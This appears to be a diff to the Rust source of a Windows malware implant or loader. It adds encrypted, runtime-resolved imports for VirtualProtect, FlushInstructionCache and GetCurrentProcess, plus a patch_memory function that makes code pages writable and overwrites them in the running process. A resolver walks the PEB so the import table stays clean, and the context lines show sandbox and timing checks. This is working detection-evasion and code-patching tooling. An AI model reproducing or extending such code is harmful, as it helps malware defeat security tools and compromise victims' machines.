@@ -38,6 +38,9 @@ use crate::polymorphic_keys::{
     GETDISKFREESPACEEXW_ENC_KEY, GETDISKFREESPACEEXW_ENC_NONCE, GETDISKFREESPACEEXW_ENC_CT,
     GETVOLUMEINFORMATIONW_ENC_KEY, GETVOLUMEINFORMATIONW_ENC_NONCE, GETVOLUMEINFORMATIONW_ENC_CT,
     GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_KEY, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_NONCE, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_CT,
+    VIRTUALPROTECT_ENC_KEY, VIRTUALPROTECT_ENC_NONCE, VIRTUALPROTECT_ENC_CT,
+    FLUSHINSTRUCTION_ENC_KEY, FLUSHINSTRUCTION_ENC_NONCE, FLUSHINSTRUCTION_ENC_CT,
+    GETCURRENTPROCESS_ENC_KEY, GETCURRENTPROCESS_ENC_NONCE, GETCURRENTPROCESS_ENC_CT,
 };
 
 // ── Types Windows nécessaires (définis manuellement) ──
@@ -85,6 +88,8 @@ pub const HKEY_CURRENT_USER: *mut u8 = 0x80000001u64 as *mut u8;
 pub const KEY_READ: u32 = 0x20019;
 pub const DISPLAY_DEVICE_ACTIVE: u32 = 0x1;
 pub const SystemProcessInformation: u32 = 5;
+pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
+pub const PAGE_EXECUTE_READ: u32 = 0x20;
 
 #[repr(C)]
 pub struct SYSTEM_INFO {
@@ -277,6 +282,21 @@ declare_api!(GetPhysicallyInstalledSystemMemory,
     KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
     GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_CT, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_KEY, GETPHYSICALLYINSTALLEDSYSTEMMEMORY_ENC_NONCE,
     unsafe extern "system" fn(*mut u64) -> i32);
+
+declare_api!(VirtualProtect,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    VIRTUALPROTECT_ENC_CT, VIRTUALPROTECT_ENC_KEY, VIRTUALPROTECT_ENC_NONCE,
+    unsafe extern "system" fn(*mut u8, usize, u32, *mut u32) -> i32);
+
+declare_api!(FlushInstructionCache,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    FLUSHINSTRUCTION_ENC_CT, FLUSHINSTRUCTION_ENC_KEY, FLUSHINSTRUCTION_ENC_NONCE,
+    unsafe extern "system" fn(*mut u8, *const u8, usize) -> i32);
+
+declare_api!(GetCurrentProcess,
+    KERNEL32_DLL_ENC_CT, KERNEL32_DLL_ENC_KEY, KERNEL32_DLL_ENC_NONCE,
+    GETCURRENTPROCESS_ENC_CT, GETCURRENTPROCESS_ENC_KEY, GETCURRENTPROCESS_ENC_NONCE,
+    unsafe extern "system" fn() -> *mut u8);
 
 // ── Fonctions utilitaires ──
 
@@ -577,3 +597,37 @@ pub fn rdtsc_timing_check() -> u64 {
 
 #[cfg(not(target_arch = "x86_64"))]
 pub fn rdtsc_timing_check() -> u64 { 0 }
+
+/// Patch `len` bytes at `addr` with `patch`, using VirtualProtect to toggle
+/// page permissions. Returns true on success.
+pub fn patch_memory(addr: *mut u8, patch: &[u8]) -> bool {
+    let vp = match VirtualProtect() {
+        Some(f) => f,
+        None => return false,
+    };
+    let flush = match FlushInstructionCache() {
+        Some(f) => f,
+        None => return false,
+    };
+    let proc = match GetCurrentProcess() {
+        Some(f) => f,
+        None => return false,
+    };
+    unsafe {
+        let mut old_prot: u32 = 0;
+        if vp(addr, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_prot) == 0 {
+            return false;
+        }
+        std::ptr::copy_nonoverlapping(patch.as_ptr(), addr, patch.len());
+        vp(addr, patch.len(), old_prot, &mut old_prot);
+        flush(proc(), addr as *const u8, patch.len());
+        true
+    }
+}
+
+/// Resolve a function address from a DLL loaded in the current process.
+/// Uses PEB walking — no GetModuleHandle/GetProcAddress in the IAT.
+pub fn resolve_fn(dll: &str, func: &str) -> Option<*mut u8> {
+    let base = inject::syscall::get_module_base(dll)?;
+    inject::syscall::resolve_export(base, func)
+}
